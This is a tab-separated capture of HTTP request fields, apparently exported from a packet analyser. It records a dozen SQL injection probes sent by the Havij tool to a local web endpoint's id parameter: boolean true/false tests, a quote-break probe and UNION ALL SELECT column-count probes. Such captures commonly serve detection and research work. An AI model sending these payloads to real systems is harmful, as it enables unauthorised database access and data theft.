http.accept	http.accept_encoding	http.accept_language	http.authbasic	http.authcitrix	http.authcitrix.domain	http.authcitrix.password	http.authcitrix.session	http.authcitrix.user	http.authorization	http.bad_header_name	http.cache_control	http.chat	http.chunk_boundary	http.chunk_size	http.chunkd_and_length	http.chunked_trailer_part	http.connection	http.content_encoding	http.content_length	http.content_length_header	http.content_type	http.cookie_pair	http.date	http.decompression_disabled	http.decompression_failed	http.file_data	http.host	http.http2_settings	http.http2_settings_uri	http.last_modified	http.leading_crlf	http.location	http.next_request_in	http.next_response_in	http.notification	http.prev_request_in	http.proxy_authenticate	http.proxy_authorization	http.proxy_connect_host	http.proxy_connect_port	http.referer	http.request	http.request.full_uri	http.request.line	http.request.method	http.request.uri.path	http.request.uri.query	http.request.uri.query.parameter	http.request.version	http.request_in	http.request_number	http.sec_websocket_accept	http.sec_websocket_extensions	http.sec_websocket_key	http.sec_websocket_protocol	http.sec_websocket_version	http.server	http.set_cookie	http.ssl_port	http.subdissector_failed	http.te_and_length	http.te_unknown	http.time	http.tls_port	http.transfer_encoding	http.unknown_header	http.upgrade	http.user_agent	http.www_authenticate	http.x_forwarded_for	http.cookie	http.request.uri
*/*																	Close										192.168.1.104															1	http://192.168.1.104/web?id=value		GET				HTTP/1.1																			Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727) Havij				/web?id=value
*/*																	Close										192.168.1.104															1	http://192.168.1.104/web?id=-9.9		GET				HTTP/1.1																			Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727) Havij				/web?id=-9.9
*/*																	Close										192.168.1.104															1	http://192.168.1.104/web?id=value%20and%201=1		GET				HTTP/1.1																			Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727) Havij				/web?id=value%20and%201=1
*/*																	Close										192.168.1.104															1	http://192.168.1.104/web?id=value%20and%201=0		GET				HTTP/1.1																			Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727) Havij				/web?id=value%20and%201=0
*/*																	Close										192.168.1.104															1	http://192.168.1.104/web?id=value'%20and%20'x'='x		GET				HTTP/1.1																			Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727) Havij				/web?id=value'%20and%20'x'='x
*/*																	Close										192.168.1.104															1	http://192.168.1.104/web?id=value'%20and%20'x'='y		GET				HTTP/1.1																			Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727) Havij				/web?id=value'%20and%20'x'='y
*/*																	Close										192.168.1.104															1	http://192.168.1.104/web?id=value"%20and%20"x"="x		GET				HTTP/1.1																			Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727) Havij				/web?id=value"%20and%20"x"="x
*/*																	Close										192.168.1.104															1	http://192.168.1.104/web?id=value"%20and%20"x"="y		GET				HTTP/1.1																			Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727) Havij				/web?id=value"%20and%20"x"="y
*/*																	Close										192.168.1.104															1	http://192.168.1.104/web?id=9999%20and%201=1		GET				HTTP/1.1																			Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727) Havij				/web?id=9999%20and%201=1
*/*																	Close										192.168.1.104															1	http://192.168.1.104/web?id=value'		GET				HTTP/1.1																			Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727) Havij				/web?id=value'
*/*																	Close										192.168.1.104															1	http://192.168.1.104/web?id=-999.9%20UNION%20ALL%20SELECT%200x31303235343830303536--		GET				HTTP/1.1																			Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727) Havij				/web?id=-999.9%20UNION%20ALL%20SELECT%200x31303235343830303536--
*/*																	Close										192.168.1.104															1	http://192.168.1.104/web?id=-999.9%20UNION%20ALL%20SELECT%200x31303235343830303536,0x31303235343830303536--		GET				HTTP/1.1																			Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727) Havij				/web?id=-999.9%20UNION%20ALL%20SELECT%200x31303235343830303536,0x31303235343830303536--
